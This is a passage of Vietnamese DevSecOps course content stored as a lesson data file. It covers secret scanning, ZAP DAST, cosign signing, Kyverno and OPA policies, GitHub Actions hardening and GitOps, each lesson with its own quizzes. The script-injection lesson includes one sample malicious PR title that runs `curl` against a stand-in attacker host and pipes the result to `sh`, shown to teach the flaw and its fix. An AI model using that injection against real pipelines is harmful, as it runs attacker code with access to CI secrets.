          "Việc đầu tiên là thu hồi và tạo secret mới (rotate), không phải xoá khỏi lịch sử Git. Xoá lịch sử bằng `git filter-repo` là việc phụ, vì bản clone, fork và cache có thể đã có secret. Sau khi rotate, kiểm tra log truy cập của nhà cung cấp xem secret đã bị dùng chưa. Và hỏi vì sao secret nằm trong code: về lâu dài, secret nên ở secret manager, được nạp lúc chạy."
        ]
      }
    ],
    summary: [
      "Secret đã vào lịch sử Git thì vẫn còn dù commit sau xoá đi.",
      "Chặn ba lớp: pre-commit hook, GitHub push protection, quét trong CI.",
      "gitleaks nhanh theo mẫu; trufflehog có thể xác minh secret còn hoạt động.",
      "Secret lộ thì rotate ngay, xoá lịch sử là việc phụ."
    ],
    pitfalls: [
      "Chỉ dựa vào pre-commit hook, trong khi ai cũng có thể bỏ qua bằng `--no-verify`.",
      "Xoá secret khỏi lịch sử Git mà không rotate, secret vẫn dùng được.",
      "Quét với checkout nông (depth 1), bỏ sót secret trong các commit trước của PR."
    ],
    quiz: [
      {
        q: "Việc đầu tiên cần làm khi phát hiện secret bị commit lên repo công khai?",
        options: ["Xoá khỏi lịch sử Git", "Thu hồi và tạo secret mới (rotate)", "Đổi repo sang private", "Đợi xem có ai dùng không"],
        answer: 1,
        explain: "Secret có thể đã bị sao chép; chỉ rotate mới vô hiệu hoá nó. Xoá lịch sử và đổi private không thu hồi được bản đã bị lấy."
      },
      {
        q: "Vì sao vẫn cần quét secret trong CI dù đã có pre-commit hook?",
        options: ["Hook chạy chậm", "Hook có thể bị bỏ qua hoặc chưa được cài trên máy developer", "CI rẻ hơn", "GitHub yêu cầu"],
        answer: 1,
        explain: "Hook nằm trên máy cá nhân nên không đảm bảo; CI là lớp kiểm soát tập trung."
      },
      {
        q: "Cờ `--only-verified` của trufflehog có tác dụng gì?",
        options: ["Chỉ quét file đã commit", "Chỉ báo secret đã được xác minh là còn hoạt động", "Bỏ qua mọi secret", "Chỉ quét nhánh main"],
        answer: 1,
        explain: "Trufflehog thử xác minh secret với nhà cung cấp; cờ này chỉ báo những secret còn dùng được, giảm false positive."
      }
    ]
  },
  "p08.m4.t4": {
    sections: [
      {
        h: "DAST: tấn công thử ứng dụng đang chạy",
        p: [
          "DAST (Dynamic Application Security Testing) kiểm tra ứng dụng từ bên ngoài, giống cách kẻ tấn công làm: gửi request HTTP, quan sát response. Nó không cần biết mã nguồn viết bằng ngôn ngữ gì. DAST bắt được những thứ SAST không thấy vì chúng nằm ở cấu hình lúc chạy: thiếu security header, cookie không có cờ `Secure` và `HttpOnly`, CORS quá rộng, trang lỗi lộ stack trace, endpoint quản trị không được bảo vệ.",
          "Vì cần ứng dụng đang chạy, DAST thường chạy trên staging sau khi deploy, hoặc trên preview environment. Nó chậm hơn SAST nhiều nên không phải lúc nào cũng chạy trên mỗi PR."
        ]
      },
      {
        h: "OWASP ZAP: baseline, full và API scan",
        list: [
          "`zap-baseline.py`: spider ứng dụng và chỉ quét thụ động (đọc response, không gửi payload tấn công). Nhanh, an toàn, chạy được mỗi lần deploy staging.",
          "`zap-full-scan.py`: thêm active scan, gửi payload thử SQL injection, XSS... Chậm và có thể tạo dữ liệu rác, chỉ chạy trên môi trường riêng, theo lịch.",
          "`zap-api-scan.py`: quét API dựa trên định nghĩa OpenAPI, hợp với backend REST vì spider không tự tìm được các endpoint JSON."
        ],
        p: [
          "Tuyệt đối không chạy active scan vào production hoặc hệ thống bạn không có quyền kiểm thử."
        ]
      },
      {
        h: "Ví dụ workflow chạy sau khi deploy staging",
        p: [
          "ZAP ghi báo cáo vào thư mục mount tại `/zap/wrk`. Cờ `-I` giúp job không lỗi chỉ vì cảnh báo mức WARN; lỗi mức FAIL vẫn làm job đỏ. File `-c` cho phép đặt từng quy tắc là FAIL, WARN hay IGNORE."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/dast.yml",
          src: `name: DAST
on:
  workflow_run:
    workflows: ["Deploy staging"]
    types: [completed]
  schedule:
    - cron: "0 20 * * 0"   # 03:00 sáng thứ Hai giờ Việt Nam

permissions:
  contents: read

jobs:
  zap-api:
    if: github.event_name == 'schedule' || github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: ZAP API scan
        run: |
          mkdir -p zap && cp .zap/rules.tsv zap/ && chmod -R 777 zap
          docker run --rm -v "$PWD/zap:/zap/wrk:rw" ghcr.io/zaproxy/zaproxy:stable \\
            zap-api-scan.py -t https://staging.example.com/openapi.json -f openapi \\
            -c rules.tsv -r report.html -J report.json -I
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        if: always()
        with:
          name: zap-report
          path: zap/`
        }
      },
      {
        h: "Giới hạn",
        p: [
          "DAST chỉ thấy những gì nó truy cập được. API cần đăng nhập thì phải cấu hình xác thực cho ZAP, nếu không nó chỉ quét trang đăng nhập. DAST cũng không cho biết lỗi nằm ở dòng code nào, nên cần kết hợp với SAST. Hãy xem DAST là lưới an toàn cho cấu hình và hành vi lúc chạy, cộng với pentest thủ công định kỳ cho các hệ thống quan trọng."
        ]
      }
    ],
    summary: [
      "DAST kiểm tra ứng dụng đang chạy từ bên ngoài qua HTTP.",
      "Bắt lỗi cấu hình lúc chạy: header, cookie, CORS, lộ thông tin lỗi.",
      "ZAP baseline quét thụ động, full scan chủ động, API scan dùng OpenAPI.",
      "Chạy trên staging hoặc môi trường riêng, không active scan vào production."
    ],
    pitfalls: [
      "Chạy active scan vào production, tạo dữ liệu rác và có thể gây sự cố.",
      "Không cấu hình xác thực, ZAP chỉ quét trang đăng nhập và báo xanh giả.",
      "Dùng spider cho REST API thuần JSON, không tìm thấy endpoint nào; nên dùng API scan với OpenAPI."
    ],
    quiz: [
      {
        q: "DAST phát hiện được loại vấn đề nào mà SAST thường bỏ sót?",
        options: ["Lỗi cú pháp", "Thiếu security header và cấu hình cookie lúc chạy", "Dependency cũ", "Commit message sai"],
        answer: 1,
        explain: "Header và cookie được cấu hình lúc chạy, thường ở proxy hoặc framework, DAST quan sát trực tiếp từ response."
      },
      {
        q: "`zap-baseline.py` khác `zap-full-scan.py` thế nào?",
        options: ["Baseline chỉ quét thụ động, full scan gửi payload tấn công chủ động", "Baseline chậm hơn", "Full scan chỉ quét header", "Không khác"],
        answer: 0,
        explain: "Baseline an toàn và nhanh; full scan thêm active scan nên chậm và có thể làm bẩn dữ liệu."
      },
      {
        q: "Với backend REST API, loại quét ZAP nào phù hợp nhất?",
        options: ["Baseline với spider", "API scan dựa trên OpenAPI", "Không cần quét", "Chỉ quét trang chủ"],
        answer: 1,
        explain: "Spider không tự tìm được endpoint JSON; API scan đọc định nghĩa OpenAPI để biết mọi endpoint."
      }
    ]
  },
  "p08.m4.t5": {
    sections: [
      {
        h: "Chuỗi cung ứng phần mềm",
        p: [
          "Khi cluster kéo image `task-api@sha256:...` về chạy, làm sao biết image đó thực sự do pipeline của bạn build từ mã trên main, không phải do ai đó push lên registry bằng token bị lộ? Và image đó chứa những gì? Hai câu hỏi này dẫn tới ba khái niệm: SBOM, chữ ký và provenance.",
          "SLSA (Supply-chain Levels for Software Artifacts) là framework mô tả các mức đảm bảo cho quá trình build. Ở mức thấp, build tạo ra provenance mô tả artifact được build thế nào; ở mức cao hơn, provenance được nền tảng build ký và quá trình build được cô lập, khó bị can thiệp."
        ],
        list: [
          "SBOM (Software Bill of Materials): danh sách mọi thành phần trong artifact, định dạng SPDX hoặc CycloneDX. Khi có CVE mới, bạn tra được ngay image nào bị ảnh hưởng.",
          "Chữ ký: chứng minh artifact được tạo bởi danh tính cụ thể và không bị sửa.",
          "Provenance: thông tin repo, commit, workflow nào đã build ra artifact."
        ]
      },
      {
        h: "Cosign keyless với OIDC",
        p: [
          "Cosign (dự án Sigstore) hỗ trợ ký keyless: không cần quản lý khoá riêng. Trong GitHub Actions, cosign dùng token OIDC của job để xin chứng chỉ ngắn hạn từ Fulcio, ký image, và ghi bản ghi vào transparency log Rekor. Chứng chỉ ghi rõ danh tính là workflow nào ở repo nào, nhánh nào. Vì vậy job cần `id-token: write`. Luôn ký theo digest, không theo tag."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml (job image)",
          src: `  image:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write   # cosign keyless dùng OIDC
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
      - uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}
      - id: build
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          push: true
          tags: ghcr.io/\${{ github.repository }}:\${{ github.sha }}
          sbom: true           # BuildKit đính kèm SBOM attestation
          provenance: mode=max # BuildKit đính kèm provenance
      - uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2
      - name: Ký image theo digest
        env:
          IMAGE: ghcr.io/\${{ github.repository }}@\${{ steps.build.outputs.digest }}
        run: cosign sign --yes "$IMAGE"
      - name: SBOM bằng Syft và đính kèm dưới dạng attestation
        env:
          IMAGE: ghcr.io/\${{ github.repository }}@\${{ steps.build.outputs.digest }}
        run: |
          syft "$IMAGE" -o spdx-json=sbom.spdx.json   # giả định đã cài syft
          cosign attest --yes --predicate sbom.spdx.json --type spdxjson "$IMAGE"`
        }
      },
      {
        h: "Xác minh trước khi deploy",
        p: [
          "Ký mà không xác minh thì vô nghĩa. Trước khi deploy, pipeline hoặc admission controller trong cluster (bài tiếp theo) phải kiểm tra chữ ký khớp đúng danh tính mong đợi: đúng repo, đúng workflow, đúng nhánh main, đúng issuer của GitHub."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `cosign verify "ghcr.io/my-org/task-api@sha256:<digest>" \\
  --certificate-identity "https://github.com/my-org/task-api/.github/workflows/ci.yml@refs/heads/main" \\
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com"

# Xác minh attestation SBOM
cosign verify-attestation --type spdxjson "ghcr.io/my-org/task-api@sha256:<digest>" \\
  --certificate-identity "https://github.com/my-org/task-api/.github/workflows/ci.yml@refs/heads/main" \\
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com"`
        }
      },
      {
        h: "GitHub artifact attestations",
        p: [
          "GitHub có sẵn tính năng artifact attestations: action `actions/attest-build-provenance` tạo provenance theo chuẩn SLSA, ký bằng Sigstore, gắn với digest của image. Người dùng xác minh bằng GitHub CLI mà không cần tự cài cosign. Cách này hợp với đội muốn đạt provenance có chữ ký mà ít cấu hình."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Xác minh provenance của image do repo trong tổ chức my-org build
gh attestation verify oci://ghcr.io/my-org/task-api@sha256:<digest> --owner my-org`
        }
      }
    ],
    summary: [
      "SBOM liệt kê thành phần của artifact; chữ ký chứng minh nguồn gốc; provenance mô tả cách build.",
      "Cosign keyless dùng OIDC, không cần quản lý khoá riêng, cần `id-token: write`.",
      "Luôn ký và xác minh theo digest, không theo tag.",
      "Xác minh phải ràng buộc đúng identity (repo, workflow, nhánh) và issuer."
    ],
    pitfalls: [
      "Ký theo tag: tag có thể trỏ sang image khác sau khi ký.",
      "Xác minh chỉ kiểm tra có chữ ký mà không ràng buộc identity, image ký bởi repo bất kỳ cũng qua.",
      "Sinh SBOM nhưng không lưu hoặc không bao giờ tra cứu khi có CVE mới."
    ],
    quiz: [
      {
        q: "Ký keyless bằng cosign trong GitHub Actions cần quyền gì?",
        options: ["contents: write", "id-token: write", "issues: write", "pages: write"],
        answer: 1,
        explain: "Cosign dùng token OIDC của job để xin chứng chỉ ký, nên cần `id-token: write`."
      },
      {
        q: "SBOM giúp gì khi một CVE mới được công bố?",
        options: ["Tự vá lỗ hổng", "Tra ngay được artifact nào chứa thành phần bị ảnh hưởng", "Ký lại image", "Xoá image cũ"],
        answer: 1,
        explain: "SBOM là danh sách thành phần; có nó bạn tìm được image bị ảnh hưởng mà không phải quét lại tất cả. SBOM không tự vá."
      },
      {
        q: "Vì sao `cosign verify` cần `--certificate-identity` và `--certificate-oidc-issuer`?",
        options: ["Để chạy nhanh hơn", "Để đảm bảo chữ ký đến từ đúng workflow, đúng repo và đúng nhà phát hành token", "Để tạo chữ ký mới", "Vì image không có digest"],
        answer: 1,
        explain: "Bất kỳ ai cũng có thể ký keyless với danh tính của họ; ràng buộc identity và issuer mới chứng minh image do pipeline của bạn tạo."
      }
    ]
  },
  "p08.m4.t6": {
    sections: [
      {
        h: "Policy as code là gì",
        p: [
          "Quy tắc như \"không container nào chạy bằng root\", \"chỉ deploy image đã ký từ registry của công ty\", \"mọi Deployment phải có giới hạn tài nguyên\" thường nằm trong tài liệu và phụ thuộc vào việc reviewer có nhớ không. Policy as code biến chúng thành mã, được version trong Git, được test, và được thực thi tự động.",
          "Có hai điểm thực thi. Trong CI: kiểm tra manifest trước khi merge bằng conftest (OPA) hoặc Kyverno CLI, phản hồi sớm cho developer. Trong cluster: admission controller (Kyverno hoặc OPA Gatekeeper) chặn resource vi phạm ngay khi gửi tới Kubernetes API. Lớp trong cluster là bắt buộc, vì ai đó có thể `kubectl apply` trực tiếp mà không qua CI."
        ]
      },
      {
        h: "Kyverno: policy viết bằng YAML",
        p: [
          "Kyverno là admission controller dành riêng cho Kubernetes, policy viết bằng YAML quen thuộc. Policy dưới đây làm hai việc: bắt buộc `runAsNonRoot`, và chỉ cho chạy image từ `ghcr.io/my-org` đã được ký bởi workflow CI trên nhánh main. Rule viết cho Pod nhưng Kyverno tự sinh rule tương ứng cho Deployment, StatefulSet, Job."
        ],
        code: {
          lang: "yaml",
          file: "policies/secure-workloads.yaml",
          src: `apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: secure-workloads
spec:
  background: true
  rules:
    - name: require-run-as-non-root
      match:
        any:
          - resources:
              kinds: [Pod]
      validate:
        failureAction: Enforce
        message: "Pod phải đặt securityContext.runAsNonRoot: true"
        pattern:
          spec:
            securityContext:
              runAsNonRoot: true

    - name: verify-image-signature
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences: ["ghcr.io/my-org/*"]
          failureAction: Enforce
          mutateDigest: true
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/my-org/task-api/.github/workflows/ci.yml@refs/heads/main"
                    issuer: "https://token.actions.githubusercontent.com"
                    rekor:
                      url: https://rekor.sigstore.dev`
        }
      },
      {
        h: "OPA và conftest trong CI",
        p: [
          "OPA (Open Policy Agent) dùng ngôn ngữ Rego, tổng quát hơn: cùng một policy kiểm tra được Kubernetes manifest, Terraform plan, file cấu hình bất kỳ. conftest chạy policy Rego trên file cục bộ, rất hợp để đặt trong CI."
        ],
        code: {
          lang: "text",
          file: "policy/deployment.rego",
          src: `package main

import rego.v1

deny contains msg if {
  input.kind == "Deployment"
  some c in input.spec.template.spec.containers
  not c.resources.limits.memory
  msg := sprintf("container %s phải đặt resources.limits.memory", [c.name])
}

# Chạy trong CI:
#   conftest test k8s/deployment.yaml --policy policy/`
        }
      },
      {
        h: "Đưa policy vào an toàn",
        p: [
          "Bật Enforce ngay trên cluster đang chạy có thể chặn cả deploy khẩn cấp. Hãy bắt đầu ở chế độ Audit để xem những gì sẽ bị chặn, sửa dần các workload, rồi mới chuyển sang Enforce. Cần cơ chế ngoại lệ có kiểm soát (ví dụ PolicyException của Kyverno) cho các thành phần hệ thống thực sự cần quyền đặc biệt. Kyverno đang phát triển thêm các loại policy dựa trên CEL; khái niệm vẫn giống nhau."
        ]
      },
      {
        h: "Những policy nên có đầu tiên",
        p: [
          "Đừng viết một trăm policy ngay. Bắt đầu với vài quy tắc có giá trị cao và ít tranh cãi, rồi mở rộng dần khi đội đã quen."
        ],
        list: [
          "Không chạy container bằng root, không `privileged`, không `hostPath` tuỳ ý.",
          "Chỉ cho phép image từ registry của công ty, và image phải được ký.",
          "Bắt buộc có `resources.requests` và `limits` cho bộ nhớ.",
          "Cấm tag `latest`, bắt buộc tag cố định hoặc digest."
        ]
      }
    ],
    summary: [
      "Policy as code biến quy tắc bảo mật thành mã, version và thực thi tự động.",
      "Thực thi ở CI (conftest, Kyverno CLI) để phản hồi sớm và ở cluster (admission controller) để bắt buộc.",
      "Kyverno viết policy bằng YAML, hỗ trợ xác minh chữ ký image.",
      "Bắt đầu ở Audit, sửa workload, rồi mới chuyển sang Enforce."
    ],
    pitfalls: [
      "Chỉ kiểm tra policy trong CI, người có quyền `kubectl apply` trực tiếp vẫn vượt qua được.",
      "Bật Enforce ngay trên cluster cũ, chặn cả các thành phần hệ thống và deploy khẩn cấp.",
      "Xác minh chữ ký image mà không ràng buộc subject, image ký bởi bất kỳ ai cũng được chấp nhận."
    ],
    quiz: [
      {
        q: "Vì sao cần admission controller trong cluster dù CI đã kiểm tra policy?",
        options: ["CI chạy chậm", "Có thể có người apply trực tiếp vào cluster mà không qua CI", "Kubernetes bắt buộc", "Để tạo image"],
        answer: 1,
        explain: "Admission controller là điểm thực thi cuối cùng mà mọi yêu cầu tới API server đều phải qua."
      },
      {
        q: "Khi mới đưa policy vào cluster đang chạy, nên dùng chế độ nào trước?",
        options: ["Enforce", "Audit", "Tắt policy", "Xoá workload cũ"],
        answer: 1,
        explain: "Audit ghi nhận vi phạm mà không chặn, giúp sửa dần trước khi Enforce."
      },
      {
        q: "conftest dùng để làm gì?",
        options: ["Build image", "Chạy policy Rego trên file cấu hình cục bộ, thường trong CI", "Ký image", "Quản lý secret"],
        answer: 1,
        explain: "conftest kiểm tra file như manifest, Terraform bằng policy OPA/Rego trước khi áp dụng."
      }
    ]
  },
  "p08.m4.t7": {
    sections: [
      {
        h: "Pipeline là mục tiêu tấn công giá trị nhất",
        p: [
          "Pipeline CI/CD giữ những thứ quý nhất: secret deploy, quyền push image, quyền vào production. Kẻ tấn công không cần hack ứng dụng của bạn nếu có thể chạy code trong pipeline. Và cách dễ nhất để chạy code trong pipeline của hàng nghìn công ty cùng lúc là tấn công một action mà họ đều dùng.",
          "Đó chính là chuyện đã xảy ra ngày 19/3/2026: kẻ tấn công dùng credential bị lộ để force-push 76/77 tag của `aquasecurity/trivy-action` và toàn bộ 7 tag của `setup-trivy`, trỏ chúng sang mã độc đánh cắp secret từ môi trường CI (advisory GHSA-69fq-xp46-6x23). Mọi workflow viết `uses: aquasecurity/trivy-action@0.x.y` (theo tag) đều chạy mã độc ở lần chạy tiếp theo mà không có dòng code nào trong repo thay đổi. Workflow pin theo commit SHA thì không bị ảnh hưởng, vì tag bị di chuyển không làm thay đổi commit mà SHA trỏ tới."
        ]
      },
      {
        h: "Các biện pháp cốt lõi",
        p: [
          "Không có biện pháp đơn lẻ nào là đủ. Danh sách dưới đây sắp theo thứ tự nên làm trước; phần lớn chỉ tốn vài dòng YAML hoặc một thay đổi trong phần cài đặt repo."
        ],
        list: [
          "Pin mọi action bên thứ ba theo commit SHA đầy đủ, kèm comment version; dùng Dependabot để cập nhật. GitHub cho phép admin bật chính sách bắt buộc pin SHA trong cài đặt Actions.",
          "Đặt `permissions` tối thiểu ở cấp workflow (`contents: read`) và chỉ mở rộng ở job cần; đặt quyền mặc định của `GITHUB_TOKEN` trong repo là chỉ đọc.",
          "Không dùng `pull_request_target` hay `workflow_run` để chạy code từ PR fork trong ngữ cảnh có secret.",
          "Không chèn trực tiếp dữ liệu người dùng kiểm soát (tiêu đề PR, tên nhánh, nội dung issue) vào `run:`; truyền qua biến môi trường.",
          "`persist-credentials: false` khi checkout nếu job không cần push, để token không nằm lại trong `.git/config`.",
          "Dùng OIDC thay secret dài hạn; environment có người duyệt cho production.",
          "Quét chính workflow bằng công cụ phân tích tĩnh cho GitHub Actions như zizmor hoặc actionlint."
        ]
      },
      {
        h: "Script injection: lỗi phổ biến nhất",
        p: [
          "Biểu thức `\${{ }}` được thay vào script trước khi shell chạy. Nếu tiêu đề PR là `a\"; curl https://attacker.example/x.sh | sh; echo \"`, dòng lệnh thành mã của kẻ tấn công. Cách sửa là đưa giá trị vào biến môi trường, để shell coi nó là dữ liệu chứ không phải mã."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/pr-check.yml",
          src: `name: PR check
on:
  pull_request:

permissions:
  contents: read   # mặc định tối thiểu cho mọi job

jobs:
  title:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      # SAI: dữ liệu do người dùng kiểm soát bị chèn thẳng vào script
      # - run: echo "\${{ github.event.pull_request.title }}"

      # ĐÚNG: truyền qua biến môi trường
      - name: Kiểm tra tiêu đề theo Conventional Commits
        env:
          TITLE: \${{ github.event.pull_request.title }}
        run: |
          printf '%s\\n' "$TITLE" | grep -Eq '^(feat|fix|chore|docs|refactor|test|ci)(\\(.+\\))?!?: .+'`
        }
      },
      {
        h: "Nếu đã dùng action bị xâm phạm",
        p: [
          "Coi như mọi secret mà workflow đó truy cập được đều đã lộ: rotate ngay token registry, credential cloud, token npm, `GITHUB_TOKEN` hết hạn khi job kết thúc nhưng PAT thì không. Xem log các lần chạy trong khoảng thời gian bị ảnh hưởng, kiểm tra CloudTrail hoặc log truy cập. Bài học lớn nhất: bảo mật pipeline không phải một công cụ mà là nhiều lớp. Pin SHA ngăn tag bị thay; permissions tối thiểu giới hạn thiệt hại; OIDC khiến credential bị đánh cắp hết hạn nhanh; environment có người duyệt ngăn deploy tự ý."
        ]
      }
    ],
    summary: [
      "Pipeline giữ secret và quyền production nên là mục tiêu tấn công hàng đầu.",
      "Sự cố trivy-action 19/3/2026: tag bị force-push thành mã độc; pin theo SHA thì an toàn.",
      "Permissions tối thiểu, không chạy code fork trong `pull_request_target`.",
      "Truyền dữ liệu người dùng qua `env`, không chèn `\${{ }}` thẳng vào `run:`.",
      "Nhiều lớp: SHA pin, quyền tối thiểu, OIDC, environment duyệt, quét workflow."
    ],
    pitfalls: [
      "Dùng action theo tag như `@v1` hay `@0.28.0`: tag có thể bị ghi đè bất cứ lúc nào.",
      "Đặt `permissions: write-all` hoặc để quyền mặc định của token là đọc/ghi cho mọi workflow.",
      "Chèn `github.event.pull_request.title` hoặc tên nhánh thẳng vào lệnh shell."
    ],
    quiz: [
      {
        q: "Trong sự cố trivy-action ngày 19/3/2026, workflow nào KHÔNG bị ảnh hưởng?",
        options: ["Workflow dùng `@v0.x.y` theo tag", "Workflow pin action theo commit SHA đầy đủ", "Workflow dùng `@master`", "Workflow có `permissions: write-all`"],
        answer: 1,
        explain: "Kẻ tấn công di chuyển tag sang commit độc hại; SHA đã pin vẫn trỏ tới commit cũ sạch. Tag và nhánh đều bị ảnh hưởng."
      },
      {
        q: "Cách an toàn để dùng tiêu đề PR trong bước `run`?",
        options: ["Chèn trực tiếp `\${{ github.event.pull_request.title }}`", "Truyền qua biến môi trường rồi dùng `\"$TITLE\"`", "Đặt trong nháy kép là đủ", "Không có cách nào"],
        answer: 1,
        explain: "Biểu thức được thay vào script trước khi chạy nên nháy kép không đủ; biến môi trường khiến shell coi giá trị là dữ liệu."
      },
      {
        q: "Vì sao `pull_request_target` nguy hiểm khi checkout code PR từ fork?",
        options: ["Vì nó chạy chậm", "Vì workflow chạy với secret và token có quyền ghi của repo đích, trong khi code là không tin cậy", "Vì nó không hỗ trợ matrix", "Vì nó xoá PR"],
        answer: 1,
        explain: "`pull_request_target` được thiết kế cho tác vụ không chạy code PR, như gắn label. Chạy code fork trong đó trao secret cho người lạ."
      }
    ]
  },
  "p08.m5.t0": {
    sections: [
      {
        h: "GitOps: Git là nguồn sự thật",
        p: [
          "GitOps là cách vận hành trong đó trạng thái mong muốn của hệ thống (Deployment nào, image nào, bao nhiêu replica, cấu hình gì) được khai báo trong Git. Một agent chạy trong cluster liên tục so sánh trạng thái thật với Git và tự điều chỉnh cho khớp. Muốn thay đổi production, bạn không chạy lệnh vào cluster mà mở pull request vào repo.",
          "Dự án OpenGitOps (thuộc CNCF) tóm tắt thành bốn nguyên tắc. Hiểu bốn nguyên tắc này giúp bạn nhận ra một hệ thống có thực sự là GitOps hay chỉ là CI chạy `kubectl apply`."
        ],
        list: [
          "Declarative: hệ thống được mô tả bằng trạng thái mong muốn, không phải chuỗi lệnh.",
          "Versioned and immutable: trạng thái được lưu có phiên bản, bất biến, có lịch sử đầy đủ (Git).",
          "Pulled automatically: agent tự kéo trạng thái mong muốn từ nguồn, không phải bị đẩy vào.",
          "Continuously reconciled: agent liên tục so sánh và sửa lệch (drift)."
        ]
      },
      {
        h: "Push-based và pull-based",
        p: [
          "Trong mô hình push truyền thống, CI có credential của cluster và chạy `kubectl apply` hoặc `helm upgrade`. CI trở thành điểm nguy hiểm: ai chiếm được CI là vào được cluster. Và nếu ai đó sửa tay trên cluster, không có gì phát hiện ra.",
          "Trong mô hình pull, agent như Argo CD hoặc Flux chạy bên trong cluster, chỉ cần quyền đọc repo. CI không cần credential của cluster nữa, chỉ cần quyền ghi vào repo config. Mọi thay đổi tay trên cluster bị phát hiện là drift và có thể tự hoàn tác. Lịch sử Git trở thành audit log: ai đổi gì, lúc nào, ai duyệt."
        ]
      },
      {
        h: "Luồng GitOps điển hình",
        code: {
          lang: "text",
          file: "luồng GitOps",
          src: `[repo app]  --PR, CI xanh, merge-->  CI build image :a1b2c3d, push registry
                                        |
                                        v
[repo config]  <--commit/PR đổi image.tag = a1b2c3d--
      |
      |  (Argo CD / Flux trong cluster kéo về mỗi vài phút hoặc qua webhook)
      v
[cluster]  so sánh trạng thái thật với Git -> apply phần khác -> báo Synced/Healthy`
        },
        p: [
          "Đánh đổi: GitOps thêm một repo và một thành phần cần vận hành, và luồng deploy có độ trễ nhỏ do chu kỳ đồng bộ. Những việc mang tính mệnh lệnh như chạy migration hay smoke test cần được diễn đạt lại thành hook hoặc job. Đổi lại, bạn có khả năng khôi phục cả cluster từ Git, rollback bằng `git revert`, và một quy trình thay đổi production thống nhất qua pull request."
        ]
      }
    ],
    summary: [
      "Git lưu trạng thái mong muốn; agent trong cluster tự đồng bộ.",
      "Bốn nguyên tắc: declarative, versioned và immutable, pulled automatically, continuously reconciled.",
      "Pull-based: CI không cần credential cluster, drift được phát hiện và sửa.",
      "Lịch sử Git là audit log; rollback bằng `git revert`."
    ],
    pitfalls: [
      "Gọi CI chạy `kubectl apply` là GitOps, trong khi không có agent reconcile và không phát hiện drift.",
      "Vẫn sửa tay trên cluster khi khẩn cấp rồi quên đưa vào Git, agent hoàn tác thay đổi đó.",
      "Lưu secret dạng plain text trong repo config vì nghĩ repo private là đủ an toàn."
    ],
    quiz: [
      {
        q: "Trong GitOps pull-based, thành phần nào áp dụng thay đổi vào cluster?",
        options: ["CI runner chạy kubectl apply", "Agent chạy trong cluster như Argo CD hoặc Flux", "Developer chạy lệnh tay", "Registry"],
        answer: 1,
        explain: "Agent trong cluster kéo trạng thái từ Git và áp dụng. CI chỉ cập nhật Git."
      },
      {
        q: "Lợi ích bảo mật của mô hình pull so với push?",
        options: ["CI không cần giữ credential của cluster", "Không cần Git", "Không cần review", "Image không cần ký"],
        answer: 0,
        explain: "Agent trong cluster chỉ cần quyền đọc repo, nên CI bị chiếm không trực tiếp dẫn tới quyền vào cluster."
      },
      {
        q: "Continuously reconciled nghĩa là gì?",
        options: ["Chỉ đồng bộ khi có người bấm nút", "Agent liên tục so sánh trạng thái thật với trạng thái mong muốn và sửa lệch", "Backup Git hằng ngày", "Chạy CI liên tục"],
        answer: 1,
        explain: "Reconcile liên tục là điều giúp phát hiện và sửa drift, kể cả thay đổi tay trên cluster."
      }
    ]
  },
  "p08.m5.t1": {
    sections: [
      {
        h: "Application: đơn vị cơ bản của Argo CD",
        p: [
          "Argo CD là công cụ GitOps phổ biến nhất cho Kubernetes, có giao diện web trực quan hiển thị cây resource và trạng thái. Mỗi Application nói: lấy manifest từ repo này, nhánh này, đường dẫn này (Helm chart, Kustomize hoặc YAML thuần), và áp vào cluster, namespace này.",
          "Hai trạng thái cần phân biệt: Sync status (Synced hoặc OutOfSync) cho biết cluster có khớp Git không; Health status (Healthy, Progressing, Degraded) cho biết resource có đang chạy tốt không. Một ứng dụng có thể Synced nhưng Degraded, ví dụ đã apply đúng image nhưng pod bị crash."
        ]
      },
      {
        h: "Sync policy: prune, selfHeal, retry",
        p: [
          "Sync policy quyết định Argo CD phản ứng thế nào khi Git và cluster lệch nhau. Với staging, tự động hoàn toàn là hợp lý. Với production, nhiều đội vẫn bật automated vì cổng duyệt đã nằm ở pull request vào repo config; số khác tắt automated và bấm Sync bằng tay sau khi merge."
        ],
        list: [
          "`automated`: tự sync khi Git thay đổi, không cần bấm nút.",
          "`prune: true`: xoá resource trên cluster khi nó bị xoá khỏi Git. Mặc định tắt để tránh xoá nhầm.",
          "`selfHeal: true`: khi ai đó sửa tay trên cluster, Argo CD đưa về đúng Git.",
          "`retry`: thử lại khi sync lỗi tạm thời, có backoff.",
          "Sync wave (annotation `argocd.argoproj.io/sync-wave`) và hook (PreSync, PostSync) để sắp thứ tự, ví dụ migration trước Deployment."
        ],
        code: {
          lang: "yaml",
          file: "argocd/task-api-production.yaml",
          src: `apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: task-api-production
  namespace: argocd
  finalizers:
    - resources-finalizer.argocd.argoproj.io   # xoá Application thì xoá luôn resource
spec:
  project: team-backend
  source:
    repoURL: https://github.com/my-org/task-config.git
    targetRevision: main
    path: apps/task-api/overlays/production
  destination:
